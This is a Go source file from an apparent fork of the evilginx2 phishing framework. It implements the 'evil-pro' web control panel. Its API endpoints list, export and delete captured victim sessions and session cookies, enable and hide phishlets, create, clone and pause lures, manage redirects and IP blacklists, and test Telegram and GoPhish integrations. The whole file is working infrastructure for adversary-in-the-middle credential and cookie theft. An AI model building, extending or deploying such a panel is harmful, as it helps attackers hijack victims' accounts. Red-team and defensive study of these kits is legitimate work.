package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// DashboardConfig holds the web control panel configuration. It is kept under the
// historical name so existing flags/wiring (-dashboard, -dashboard-user/-pass,
// `config dashboard-user/pass`, the dashboardsub virtual host) keep working.
type DashboardConfig struct {
	Enabled     bool   `json:"enabled"`
	BindAddress string `json:"bind_address"`
	Username    string `json:"username"`
	Password    string `json:"password"`
}

const (
	panelCookieName = "ep_session"
	panelTokenTTL   = 24 * time.Hour
	panelTitle      = "evil-pro control panel"
)

// authToken is an in-memory authenticated panel session.
type authToken struct {
	user    string
	expires time.Time
}

// DashboardServer serves the control panel: the SPA, its assets and the REST API.
//
// The exported method set (NewDashboardServer / SetCredentials / Handler / Start /
// Stop) is intentionally identical to the legacy dashboard so main.go and the
// terminal wiring do not change. SetProxy/SetBlacklist/SetCertDb supply the extra
// handles the panel needs to control every fork feature.
type DashboardServer struct {
	config *DashboardConfig
	db     *database.Database
	cfg    *Config

	hp    *HttpProxy
	bl    *Blacklist
	crtDb *CertDb

	server  *http.Server
	started time.Time

	mu     sync.RWMutex // guards config credentials + token map
	tokens map[string]*authToken
	opMu   sync.Mutex // serializes mutating operations (cfg / lures / phishlets)

	cacheMu  sync.RWMutex
	sessions []*database.Session
}

// NewDashboardServer creates a new control panel instance.
func NewDashboardServer(cfg *DashboardConfig, db *database.Database, phishCfg *Config) (*DashboardServer, error) {
	if cfg == nil {
		return nil, fmt.Errorf("dashboard: config is nil")
	}
	if db == nil {
		return nil, fmt.Errorf("dashboard: database reference is nil")
	}
	return &DashboardServer{
		config: cfg,
		db:     db,
		cfg:    phishCfg,
		tokens: make(map[string]*authToken),
	}, nil
}

// SetProxy supplies the running proxy so the panel can show live state and
// toggle features that live on the proxy (blacklist, hide, certs).
func (ds *DashboardServer) SetProxy(hp *HttpProxy) { ds.hp = hp }

// SetBlacklist supplies the blacklist so the panel can view and edit it.
func (ds *DashboardServer) SetBlacklist(bl *Blacklist) { ds.bl = bl }

// SetCertDb supplies the certificate database for cert status / re-provisioning.
func (ds *DashboardServer) SetCertDb(c *CertDb) { ds.crtDb = c }

// SetCredentials updates the login username and password at runtime.
func (ds *DashboardServer) SetCredentials(user, pass string) {
	ds.mu.Lock()
	ds.config.Username = user
	ds.config.Password = pass
	ds.mu.Unlock()
}

func (ds *DashboardServer) creds() (string, string) {
	ds.mu.RLock()
	defer ds.mu.RUnlock()
	return ds.config.Username, ds.config.Password
}

// Handler returns the panel http.Handler (used for the dashboardsub virtual host).
func (ds *DashboardServer) Handler() http.Handler { return ds.buildMux() }

// Start begins the panel HTTP server on the configured address.
func (ds *DashboardServer) Start() error {
	if !ds.config.Enabled {
		log.Info("dashboard: web interface is disabled")
		return nil
	}
	ds.started = time.Now()
	ds.server = &http.Server{
		Addr:         ds.config.BindAddress,
		Handler:      ds.buildMux(),
		ReadTimeout:  20 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  90 * time.Second,
	}
	go func() {
		log.Info("dashboard: control panel starting on http://%s", ds.config.BindAddress)
		if err := ds.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("dashboard: server error: %v", err)
		}
	}()
	return nil
}

// Stop gracefully shuts down the panel HTTP server.
func (ds *DashboardServer) Stop() error {
	if ds.server != nil {
		log.Info("dashboard: shutting down control panel")
		return ds.server.Close()
	}
	return nil
}

// ---------------------------------------------------------------------------
// routing
// ---------------------------------------------------------------------------

func (ds *DashboardServer) buildMux() http.Handler {
	mux := http.NewServeMux()

	// --- public: assets, login page, auth endpoints ---
	mux.HandleFunc("GET /static/app.css", ds.serveAsset(panelCSS, "text/css; charset=utf-8"))
	mux.HandleFunc("GET /static/app.js", ds.serveAsset(panelJS, "application/javascript; charset=utf-8"))
	mux.HandleFunc("GET /static/login.css", ds.serveAsset(panelLoginCSS, "text/css; charset=utf-8"))
	mux.HandleFunc("GET /favicon.ico", ds.serveFavicon)
	mux.HandleFunc("GET /login", ds.handleLoginPage)
	mux.HandleFunc("POST /api/v1/login", ds.handleLogin)
	mux.HandleFunc("POST /api/v1/logout", ds.handleLogout)

	// --- page (auth) ---
	mux.Handle("GET /", ds.auth(http.HandlerFunc(ds.handleIndex)))

	// --- api (auth) ---
	api := func(method, path string, h http.HandlerFunc) {
		mux.Handle(method+" "+path, ds.auth(h))
	}

	api("GET", "/api/v1/me", ds.handleMe)
	api("GET", "/api/v1/overview", ds.handleOverview)
	api("GET", "/api/v1/system", ds.handleSystem)

	api("GET", "/api/v1/sessions", ds.handleSessions)
	api("GET", "/api/v1/sessions/export", ds.handleSessionsExport)
	api("GET", "/api/v1/sessions/{id}", ds.handleSessionDetail)
	api("DELETE", "/api/v1/sessions/{id}", ds.handleSessionDelete)
	api("GET", "/api/v1/sessions/{id}/cookies", ds.handleSessionCookies)
	api("POST", "/api/v1/sessions/delete", ds.handleSessionsBulkDelete)
	api("POST", "/api/v1/sessions/clear", ds.handleSessionsClear)

	api("GET", "/api/v1/phishlets", ds.handlePhishlets)
	api("POST", "/api/v1/phishlets/refresh", ds.handlePhishletsRefresh)
	api("GET", "/api/v1/phishlets/{name}/yaml", ds.handlePhishletYAML)
	api("POST", "/api/v1/phishlets/{name}/enable", ds.handlePhishletEnable)
	api("POST", "/api/v1/phishlets/{name}/disable", ds.handlePhishletDisable)
	api("POST", "/api/v1/phishlets/{name}/hide", ds.handlePhishletHide)
	api("POST", "/api/v1/phishlets/{name}/hostname", ds.handlePhishletHostname)
	api("POST", "/api/v1/phishlets/{name}/unauth_url", ds.handlePhishletUnauthURL)
	api("POST", "/api/v1/phishlets/{name}/reload", ds.handlePhishletReload)
	api("GET", "/api/v1/phishlets/{name}/hosts", ds.handlePhishletHosts)

	api("GET", "/api/v1/lures", ds.handleLures)
	api("POST", "/api/v1/lures", ds.handleLureCreate)
	api("GET", "/api/v1/lures/{id}", ds.handleLureDetail)
	api("POST", "/api/v1/lures/{id}/edit", ds.handleLureEdit)
	api("POST", "/api/v1/lures/{id}/clone", ds.handleLureClone)
	api("DELETE", "/api/v1/lures/{id}", ds.handleLureDelete)
	api("POST", "/api/v1/lures/{id}/pause", ds.handleLurePause)
	api("POST", "/api/v1/lures/{id}/unpause", ds.handleLureUnpause)
	api("GET", "/api/v1/lures/{id}/url", ds.handleLureURL)

	api("GET", "/api/v1/autolures", ds.handleAutoLures)
	api("POST", "/api/v1/autolures/{id}/notify", ds.handleAutoLureNotify)

	api("GET", "/api/v1/redirects", ds.handleRedirects)
	api("GET", "/api/v1/redirect-templates", ds.handleRedirectTemplates)
	api("GET", "/api/v1/redirect-templates/{slug}", ds.handleRedirectTemplatePreview)
	api("POST", "/api/v1/redirects", ds.handleRedirectAdd)
	api("POST", "/api/v1/redirects/{id}/edit", ds.handleRedirectEdit)
	api("DELETE", "/api/v1/redirects/{id}", ds.handleRedirectDelete)
	api("GET", "/api/v1/redirects/files", ds.handleRedirectFiles)

	api("GET", "/api/v1/blacklist", ds.handleBlacklist)
	api("POST", "/api/v1/blacklist/mode", ds.handleBlacklistMode)
	api("POST", "/api/v1/blacklist", ds.handleBlacklistAdd)
	api("DELETE", "/api/v1/blacklist/{ip}", ds.handleBlacklistDelete)

	api("GET", "/api/v1/config", ds.handleConfigGet)
	api("POST", "/api/v1/config", ds.handleConfigSet)
	api("POST", "/api/v1/config/turnstile", ds.handleConfigTurnstile)
	api("POST", "/api/v1/integrations/telegram/test", ds.handleTelegramTest)
	api("POST", "/api/v1/integrations/gophish/test", ds.handleGoPhishTest)
	api("POST", "/api/v1/cert/test", ds.handleCertTest)

	// --- legacy aliases (kept so older tooling / bookmarks keep working) ---
	mux.Handle("GET /api/sessions", ds.auth(http.HandlerFunc(ds.handleSessions)))
	mux.Handle("GET /api/sessions/export", ds.auth(http.HandlerFunc(ds.handleSessionsExport)))
	mux.Handle("GET /api/sessions/{id}", ds.auth(http.HandlerFunc(ds.handleSessionDetail)))
	mux.Handle("DELETE /api/sessions/{id}", ds.auth(http.HandlerFunc(ds.handleSessionDelete)))
	mux.Handle("GET /api/cookies/{id}", ds.auth(http.HandlerFunc(ds.handleSessionCookies)))

	return mux
}

// ---------------------------------------------------------------------------
// auth middleware
// ---------------------------------------------------------------------------

func (ds *DashboardServer) auth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		user, pass := ds.creds()
		if user == "" && pass == "" { // auth disabled
			next.ServeHTTP(w, r)
			return
		}

		if c, err := r.Cookie(panelCookieName); err == nil && ds.tokenValid(c.Value) {
			next.ServeHTTP(w, r)
			return
		}
		if h := r.Header.Get("Authorization"); strings.HasPrefix(h, "Bearer ") {
			if ds.tokenValid(strings.TrimSpace(strings.TrimPrefix(h, "Bearer "))) {
				next.ServeHTTP(w, r)
				return
			}
		}
		if bu, bp, ok := r.BasicAuth(); ok && bu == user && bp == pass {
			next.ServeHTTP(w, r)
			return
		}

		if strings.HasPrefix(r.URL.Path, "/api/") {
			writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"error": "unauthorized"})
			return
		}
		http.Redirect(w, r, "/login", http.StatusFound)
	})
}

func (ds *DashboardServer) tokenValid(tok string) bool {
	if tok == "" {
		return false
	}
	val, err := ds.db.GetAuthToken(tok)
	if err != nil || val == "" {
		return false
	}
	parts := strings.SplitN(val, "|", 2)
	if len(parts) != 2 {
		return false
	}
	exp, err := strconv.ParseInt(parts[1], 10, 64)
	if err != nil {
		return false
	}
	if time.Now().Unix() > exp {
		ds.db.DeleteAuthToken(tok)
		return false
	}
	return true
}

// newToken issues a token persisted in the database so logins survive a restart.
func (ds *DashboardServer) newToken(user string) string {
	tok := GenRandomToken()
	exp := time.Now().Add(panelTokenTTL).Unix()
	_ = ds.db.StoreAuthToken(tok, user+"|"+strconv.FormatInt(exp, 10))
	return tok
}

func (ds *DashboardServer) dropToken(tok string) {
	_ = ds.db.DeleteAuthToken(tok)
}

// ---------------------------------------------------------------------------
// pages & assets
// ---------------------------------------------------------------------------

func (ds *DashboardServer) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	fmt.Fprint(w, panelIndexHTML)
}

func (ds *DashboardServer) handleLoginPage(w http.ResponseWriter, r *http.Request) {
	// already authenticated -> straight to the app
	if c, err := r.Cookie(panelCookieName); err == nil && ds.tokenValid(c.Value) {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	fmt.Fprint(w, panelLoginHTML)
}

func (ds *DashboardServer) serveAsset(body, ctype string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", ctype)
		w.Header().Set("Cache-Control", "no-cache")
		fmt.Fprint(w, body)
	}
}

func (ds *DashboardServer) serveFavicon(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "image/svg+xml")
	w.Header().Set("Cache-Control", "max-age=86400")
	fmt.Fprint(w, panelFavicon)
}

// ---------------------------------------------------------------------------
// auth handlers
// ---------------------------------------------------------------------------

func (ds *DashboardServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		jsonErr(w, http.StatusBadRequest, "invalid request body")
		return
	}
	user, pass := ds.creds()
	if user == "" && pass == "" {
		http.SetCookie(w, &http.Cookie{Name: panelCookieName, Value: ds.newToken("admin"), Path: "/", HttpOnly: true, SameSite: http.SameSiteLaxMode, Secure: r.TLS != nil, MaxAge: int(panelTokenTTL.Seconds())})
		writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
		return
	}
	if payload.Username != user || payload.Password != pass {
		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"error": "invalid credentials"})
		return
	}
	tok := ds.newToken(user)
	http.SetCookie(w, &http.Cookie{
		Name:     panelCookieName,
		Value:    tok,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
		Secure:   r.TLS != nil,
		MaxAge:   int(panelTokenTTL.Seconds()),
	})
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

func (ds *DashboardServer) handleLogout(w http.ResponseWriter, r *http.Request) {
	if c, err := r.Cookie(panelCookieName); err == nil {
		ds.dropToken(c.Value)
	}
	http.SetCookie(w, &http.Cookie{Name: panelCookieName, Value: "", Path: "/", HttpOnly: true, MaxAge: -1})
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

func (ds *DashboardServer) handleMe(w http.ResponseWriter, r *http.Request) {
	user, _ := ds.creds()
	if user == "" {
		user = "admin"
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"username":   user,
		"version":    fmt.Sprintf("%s (%s)", VERSION, COMMIT),
		"auth":       ds.credsEnabled(),
		"server_now": time.Now().Unix(),
	})
}

func (ds *DashboardServer) credsEnabled() bool {
	u, p := ds.creds()
	return u != "" || p != ""
}

// ---------------------------------------------------------------------------
// shared helpers
// ---------------------------------------------------------------------------

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(v); err != nil {
		log.Debug("panel: json encode: %v", err)
	}
}

func jsonErr(w http.ResponseWriter, status int, msg string) {
	writeJSON(w, status, map[string]interface{}{"error": msg})
}

func readJSON(r *http.Request, v interface{}) error {
	return json.NewDecoder(r.Body).Decode(v)
}

func (ds *DashboardServer) baseDomain() string {
	if ds.cfg == nil {
		return ""
	}
	return ds.cfg.GetBaseDomain()
}

// reloadSessions refreshes the in-memory session cache from the database.
func (ds *DashboardServer) reloadSessions() error {
	sessions, err := ds.db.ListSessions()
	if err != nil {
		return err
	}
	ds.cacheMu.Lock()
	ds.sessions = sessions
	ds.cacheMu.Unlock()
	return nil
}

func (ds *DashboardServer) cachedSessions() []*database.Session {
	ds.cacheMu.RLock()
	defer ds.cacheMu.RUnlock()
	out := make([]*database.Session, len(ds.sessions))
	copy(out, ds.sessions)
	return out
}

// hasTokens reports whether a session carries any captured tokens.
func hasTokens(s *database.Session) bool {
	return len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
}

// activeSessionCount returns the number of live (in-memory) proxy sessions.
func (ds *DashboardServer) activeSessionCount() int {
	if ds.hp == nil {
		return 0
	}
	ds.hp.session_mtx.Lock()
	defer ds.hp.session_mtx.Unlock()
	return len(ds.hp.sessions)
}
